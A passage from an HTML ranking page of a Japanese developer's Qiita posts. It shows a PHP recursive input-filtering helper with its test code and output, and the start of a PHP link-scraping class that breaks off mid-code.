	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />27位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>45</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/c39b9ee695a5c2e74627">filter_input_array_recursive</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-06 20:23:56</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="これは何" class="fragment"></span><a href="#%E3%81%93%E3%82%8C%E3%81%AF%E4%BD%95"><i class="fa fa-link"></i></a><strong>これは何？</strong>
</h1>

<p><strong><a href="http://www.php.net/manual/ja/function.filter-input-array.php" rel="nofollow noopener" target="_blank">filter_input_array</a></strong> 関数の惜しいところを使いやすく、安全にした強化版です。</p>

<p><strong>フィルタリングされる変数名を多次元配列で定義できます。</strong></p>

<p>cURLにおけるファイルアップロードに関する問題の解決策としてPHP公式が採用した<ins>葉要素にオプション専用のクラスを用意する</ins>という手段を真似て、任意のフィルタによる再帰的フィルタリングを可能にしました。（詳しくは <strong><a href="http://qiita.com/mpyw/items/c2d2f9cf67072e926721" id="reference-f2455f5158f79a8922f3">「PHPでcURLのクソ仕様 "@" を回避する」</a></strong> で紹介しています）</p>

<h1>
<span id="filter_input_simple-関数との比較" class="fragment"></span><a href="#filter_input_simple-%E9%96%A2%E6%95%B0%E3%81%A8%E3%81%AE%E6%AF%94%E8%BC%83"><i class="fa fa-link"></i></a><strong><a href="http://qiita.com/mpyw/items/5a7242269f51dfabc973" id="reference-57bdbf0058081e97a967">filter_input_simple</a></strong> 関数との比較</h1>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center"><strong><a href="http://qiita.com/mpyw/items/5a7242269f51dfabc973">filter_input_simple</a></strong></th>
<th style="text-align: center"><strong><a href="http://qiita.com/mpyw/items/c39b9ee695a5c2e74627">filter_input_array_recursive</a></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">パフォーマンス(初回コール時)</td>
<td style="text-align: center">△</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: center">パフォーマンス(2回目以降)</td>
<td style="text-align: center">◎</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: center">ネストした配列への対応</td>
<td style="text-align: center">◎</td>
<td style="text-align: center">◎</td>
</tr>
<tr>
<td style="text-align: center">ネストした任意の配列への対応</td>
<td style="text-align: center">×</td>
<td style="text-align: center">◎</td>
</tr>
</tbody>
</table>

<h1>
<span id="クラスと関数の定義" class="fragment"></span><a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%A8%E9%96%A2%E6%95%B0%E3%81%AE%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a><strong>クラスと関数の定義</strong>
</h1>

<h2>
<span id="filterobject-クラス" class="fragment"></span><a href="#filterobject-%E3%82%AF%E3%83%A9%E3%82%B9"><i class="fa fa-link"></i></a><strong>FilterObject クラス</strong>
</h2>

<h3>
<span id="コンストラクタのシグネチャ" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E3%81%AE%E3%82%B7%E3%82%B0%E3%83%8D%E3%83%81%E3%83%A3"><i class="fa fa-link"></i></a><strong>コンストラクタのシグネチャ</strong>
</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">public</span> <span class="nx">__construct</span><span class="p">(</span><span class="nx">int</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="nx">FILTER_DEFAULT</span><span class="p">,</span> <span class="nx">mixed</span> <span class="nv">$options</span> <span class="o">=</span> <span class="nx">FILTER_REQUIRE_SCALAR</span><span class="p">)</span>
</pre></div></div>

<h3>
<span id="コンストラクタの引数" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E3%81%AE%E5%BC%95%E6%95%B0"><i class="fa fa-link"></i></a><strong>コンストラクタの引数</strong>
</h3>

<h4>
<span id="filter" class="fragment"></span><a href="#filter"><i class="fa fa-link"></i></a><em>$filter</em>
</h4>

<p><strong><a href="http://www.php.net/manual/ja/function.filter-input.php" rel="nofollow noopener" target="_blank">filter_input</a></strong> 関数の引数と同様です。</p>

<h4>
<span id="options" class="fragment"></span><a href="#options"><i class="fa fa-link"></i></a><em>$options</em>
</h4>

<p><strong><a href="http://www.php.net/manual/ja/function.filter-input.php" rel="nofollow noopener" target="_blank">filter_input</a></strong> 関数の引数と同様です。</p>

<h3>
<span id="ソースコード" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><strong>ソースコード</strong>
</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="sd">/**</span>
<span class="sd"> * Object for filter_input_array_recursive().</span>
<span class="sd"> */</span>
<span class="k">class</span> <span class="nc">FilterObject</span> <span class="p">{</span>

    <span class="k">private</span> <span class="nv">$filter</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$options</span><span class="p">;</span>

    <span class="sd">/**</span>
<span class="sd">     * Constructor.</span>
<span class="sd">     * </span>
<span class="sd">     * @param int   $filter  same as ones for filter_input().</span>
<span class="sd">     * @param mixed $options same as ones for filter_input().</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$filter</span> <span class="o">=</span> <span class="nx">FILTER_DEFAULT</span><span class="p">,</span> <span class="nv">$options</span> <span class="o">=</span> <span class="nx">FILTER_REQUIRE_SCALAR</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter</span>  <span class="o">=</span> <span class="nv">$filter</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getOptions</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h2>
<span id="filter_input_array_recursive-関数" class="fragment"></span><a href="#filter_input_array_recursive-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><strong>filter_input_array_recursive 関数</strong>
</h2>

<h3>
<span id="シグネチャ" class="fragment"></span><a href="#%E3%82%B7%E3%82%B0%E3%83%8D%E3%83%81%E3%83%A3"><i class="fa fa-link"></i></a><strong>シグネチャ</strong>
</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">array</span> <span class="nx">filter_input_array_recursive</span><span class="p">(</span><span class="nx">int</span> <span class="nv">$type</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$filters</span><span class="p">)</span>
</pre></div></div>

<h3>
<span id="引数" class="fragment"></span><a href="#%E5%BC%95%E6%95%B0"><i class="fa fa-link"></i></a><strong>引数</strong>
</h3>

<h4>
<span id="type" class="fragment"></span><a href="#type"><i class="fa fa-link"></i></a><em>$type</em>
</h4>

<p><code>INPUT_GET</code> <code>INPUT_POST</code> <code>INPUT_COOKIE</code> <code>INPUT_REQUEST</code> のいずれか。</p>

<h4>
<span id="filters" class="fragment"></span><a href="#filters"><i class="fa fa-link"></i></a><em>$filters</em>
</h4>

<p>以下の形式の要素で構成される配列。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>"name属性値" =&gt; FilterObjectのインスタンス
</pre></div></div>

<ul>
<li>配列がネストしても構いません。</li>
<li>FilterObjectのインスタンス以外を渡した場合、 <code>new FilterObject</code> で生成されるデフォルトオプションが適用されます。</li>
</ul>

<h3>
<span id="返り値" class="fragment"></span><a href="#%E8%BF%94%E3%82%8A%E5%80%A4"><i class="fa fa-link"></i></a><strong>返り値</strong>
</h3>

<p>フィルタリングした配列を返します。</p>

<h3>
<span id="ソースコード-1" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89-1"><i class="fa fa-link"></i></a><strong>ソースコード</strong>
</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="sd">/**</span>
<span class="sd"> * Apply filter_input() recursively.</span>
<span class="sd"> * </span>
<span class="sd"> * @param int   $type    INPUT_GET, INPUT_POST, INPUT_COOKIE or INPUT_REQUEST.</span>
<span class="sd"> * @param array $filters Multi-demensional array,</span>
<span class="sd"> *                       which contains FilterObject for each leaf.</span>
<span class="sd"> * @return array</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">filter_input_array_recursive</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$filters</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">static</span> <span class="nv">$recursive_static</span><span class="p">;</span>
    <span class="k">static</span> <span class="nv">$flag_match</span><span class="p">;</span>
    <span class="k">static</span> <span class="nv">$is_not_array</span><span class="p">;</span>
    <span class="k">static</span> <span class="nv">$filter_array</span><span class="p">;</span>
    <span class="k">static</span> <span class="nv">$types</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$flag_match</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* initialize static variables */</span>
        <span class="nv">$types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="nx">INPUT_GET</span>     <span class="o">=&gt;</span> <span class="nv">$_GET</span><span class="p">,</span>
            <span class="nx">INPUT_POST</span>    <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">,</span>
            <span class="nx">INPUT_COOKIE</span>  <span class="o">=&gt;</span> <span class="nv">$_COOKIE</span><span class="p">,</span>
            <span class="nx">INPUT_REQUEST</span> <span class="o">=&gt;</span> <span class="nv">$_REQUEST</span><span class="p">,</span>
        <span class="p">);</span>
        <span class="nv">$flag_match</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="s1">'flags'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$v</span><span class="p">[</span><span class="s1">'flags'</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$v</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nv">$f</span><span class="p">;</span>
        <span class="p">};</span>
        <span class="nv">$is_not_array</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="p">};</span>
        <span class="nv">$filter_array</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$v</span> <span class="o">:</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">};</span>
    <span class="p">}</span>
    <span class="nv">$recursive</span> <span class="o">=</span> <span class="nv">$recursive_static</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$recursive</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* only for first loop */</span>
        <span class="nv">$type</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$type</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$type</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\InvalidArgumentException</span><span class="p">(</span>
                <span class="s1">'unknown super global var type'</span>
            <span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$types</span><span class="p">[</span><span class="nv">$type</span><span class="p">];</span>
        <span class="nv">$recursive_static</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="cm">/* after first loop */</span>
        <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// apply child filters</span>
            <span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">filter_input_array_recursive</span><span class="p">(</span>
                <span class="nb">isset</span><span class="p">(</span><span class="nv">$var</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$var</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">:</span> <span class="k">array</span><span class="p">(),</span>
                <span class="nv">$value</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$value</span> <span class="nx">instanceof</span> <span class="nx">FilterObject</span><span class="p">))</span> <span class="p">{</span>
                <span class="c1">// create default FilterObject for invalid leaf</span>
                <span class="nv">$value</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FilterObject</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$value</span><span class="o">-&gt;</span><span class="na">getFilter</span><span class="p">();</span>
            <span class="nv">$options</span> <span class="o">=</span> <span class="nv">$value</span><span class="o">-&gt;</span><span class="na">getOptions</span><span class="p">();</span>
            <span class="c1">// check if key exists...</span>
            <span class="c1">// true  -&gt; apply filter_var() with supplied filter and options</span>
            <span class="c1">// false -&gt; regard as null</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> 
                    <span class="nb">isset</span><span class="p">(</span><span class="nv">$var</span><span class="p">[</span><span class="nv">$key</span><span class="p">])</span> <span class="o">?</span>
                    <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$var</span><span class="p">[</span><span class="nv">$key</span><span class="p">],</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$options</span><span class="p">)</span> <span class="o">:</span>
                    <span class="k">null</span>
                <span class="p">;</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$recursive_static</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
                <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$flag_match</span><span class="p">(</span><span class="nv">$options</span><span class="p">,</span> <span class="nx">FILTER_FORCE_ARRAY</span> <span class="o">|</span> <span class="nx">FILTER_REQUIRE_ARRAY</span><span class="p">))</span> <span class="p">{</span>
                <span class="c1">// differently from filter_input(),</span>
                <span class="c1">// this function prevent unexpected non-array value</span>
                <span class="c1">// or multi-demensional array</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$flag_match</span><span class="p">(</span><span class="nv">$options</span><span class="p">,</span> <span class="nx">FILTER_FORCE_ARRAY</span><span class="p">))</span> <span class="p">{</span>
                    <span class="c1">// eliminate arrays</span>
                    <span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_filter</span><span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">],</span> <span class="nv">$is_not_array</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="c1">// change arrays into false</span>
                    <span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="nv">$filter_array</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$recursive</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* only for first loop */</span>
        <span class="nv">$recursive_static</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h1>
<span id="基本的な使い方" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a><strong>基本的な使い方</strong>
</h1>

<h2>
<span id="テストコード" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><strong>テストコード</strong>
</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">][</span><span class="s1">'bar'</span><span class="p">][</span><span class="s1">'validated_float'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'1,234.213'</span><span class="p">;</span>
<span class="nv">$_POST</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">][</span><span class="s1">'forced_1d_array'</span><span class="p">]</span>        <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'b'</span><span class="p">),</span> <span class="s1">'c'</span><span class="p">);</span>
<span class="nv">$_POST</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">][</span><span class="s1">'required_1d_array'</span><span class="p">]</span>      <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'b'</span><span class="p">),</span> <span class="s1">'c'</span><span class="p">);</span>
<span class="nv">$_POST</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">][</span><span class="s1">'required_scalar'</span><span class="p">]</span>        <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'b'</span><span class="p">),</span> <span class="s1">'c'</span><span class="p">);</span>

<span class="nb">var_dump</span><span class="p">(</span><span class="nx">filter_input_array_recursive</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'foo'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'bar'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'validated_float'</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">FilterObject</span><span class="p">(</span>
                <span class="nx">FILTER_VALIDATE_FLOAT</span><span class="p">,</span>
                <span class="k">array</span><span class="p">(</span>
                    <span class="s1">'options'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'min_range'</span> <span class="o">=&gt;</span> <span class="mi">1234</span><span class="p">,</span>
                        <span class="s1">'max_range'</span> <span class="o">=&gt;</span> <span class="mi">1235</span><span class="p">,</span>
                    <span class="p">),</span>
                    <span class="s1">'flags'</span> <span class="o">=&gt;</span> <span class="nx">FILTER_FLAG_ALLOW_THOUSAND</span><span class="p">,</span>
                <span class="p">)</span>
            <span class="p">),</span>
        <span class="p">),</span>
        <span class="s1">'forced_1d_array'</span>   <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">FilterObject</span><span class="p">(</span><span class="nx">FILTER_DEFAULT</span><span class="p">,</span> <span class="nx">FILTER_FORCE_ARRAY</span><span class="p">),</span>
        <span class="s1">'required_1d_array'</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">FilterObject</span><span class="p">(</span><span class="nx">FILTER_DEFAULT</span><span class="p">,</span> <span class="nx">FILTER_REQUIRE_ARRAY</span><span class="p">),</span>
        <span class="s1">'required_scalar'</span>   <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
    <span class="p">),</span>
<span class="p">)));</span>
</pre></div></div>

<h2>
<span id="実行結果" class="fragment"></span><a href="#%E5%AE%9F%E8%A1%8C%E7%B5%90%E6%9E%9C"><i class="fa fa-link"></i></a><strong>実行結果</strong>
</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="s2">"foo"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="k">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">[</span><span class="s2">"bar"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="s2">"validated_float"</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="nx">float</span><span class="p">(</span><span class="mf">1234.213</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">[</span><span class="s2">"forced_1d_array"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"a"</span>
      <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"c"</span>
    <span class="p">}</span>
    <span class="p">[</span><span class="s2">"required_1d_array"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"a"</span>
      <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="nx">bool</span><span class="p">(</span><span class="k">false</span><span class="p">)</span>
      <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
      <span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">"c"</span>
    <span class="p">}</span>
    <span class="p">[</span><span class="s2">"required_scalar"</span><span class="p">]</span><span class="o">=&gt;</span>
    <span class="nx">bool</span><span class="p">(</span><span class="k">false</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />28位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>42</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/85d1e23dc7c58f1014d1">[PHP] WEBページ内に存在する外部へのリンクを全て取得する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-01-19 04:57:02</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[HTML]</b> <b>[正規表現]</b> <b>[スクレイピング]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p>あるWEBページから外部に飛ばされているリンクを全件取得して、プログラムからサイトマップ全体像を掴みたいとき、ありますよね。既にいいプログラムがあるかもしれないので、ひとまずググってみました。</p>

<p><a href="https://camo.qiitausercontent.com/36762bead3dedd69b942def8b7c72a5bf1d081a6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f62363036333136632d333262632d326662352d303437662d6433363736366434353531372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/36762bead3dedd69b942def8b7c72a5bf1d081a6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f62363036333136632d333262632d326662352d303437662d6433363736366434353531372e706e67" alt="ss (2014-01-19 at 04.16.54).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/b606316c-32bc-2fb5-047f-d36766d45517.png"></a></p>

<h3>
<span id="php-webページ内のリンク先urlをすべて取得する" class="fragment"></span><a href="#php-web%E3%83%9A%E3%83%BC%E3%82%B8%E5%86%85%E3%81%AE%E3%83%AA%E3%83%B3%E3%82%AF%E5%85%88url%E3%82%92%E3%81%99%E3%81%B9%E3%81%A6%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://blog.livedoor.jp/qoozy/archives/52488858.html" rel="nofollow noopener" target="_blank">[php] WEBページ内のリンク先URLをすべて取得する</a>
</h3>

<p>ソースコードを覗いてみると・・・ <strong>「汚い。」</strong> （即答）<br>
しかもこのコードを書いたブログ管理人さんも</p>

<blockquote>
<p>コードについては、何をしてるのかさっぱりわかりません！<br>
まー、とりあえず、これであれをそーすれば、自動でダウンロードするあれが作れるはず！</p>
</blockquote>

<p>と説明を放棄されているし、このコードのもとになったサイトもドメインの有効期限が切れているという酷い有様。他にいいサンプルコードも見つからなかったので、自分で一から書いてみることにしました。</p>

<h1>
<span id="urlscraper-クラス" class="fragment"></span><a href="#urlscraper-%E3%82%AF%E3%83%A9%E3%82%B9"><i class="fa fa-link"></i></a><strong>UrlScraper</strong> クラス</h1>

<p>クロージャは使っていないので PHP5.2 ぐらいなら多分動きます。<del>コメントはめんどくさいので入れてません</del></p>

<p>ライセンスは <strong>CC0</strong> とします。バグ修正・改良して報告していただけるのもOK、パクって自分が書いたことにしてもOK！</p>

<h2>
<span id="コード" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>コード</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">UrlScraper</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="nv">$base_href</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$p</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">parseUrl</span><span class="p">(</span><span class="nv">$base_href</span><span class="p">);</span>
        <span class="nv">$p</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">normalize</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]);</span>
        <span class="nv">$regex</span> <span class="o">=</span> <span class="s1">'@&lt;a[^&gt;]*?(?&lt;!\.)href="([^"]*+)"[^&gt;]*+&gt;(.*?)&lt;/a&gt;@si'</span><span class="p">;</span>
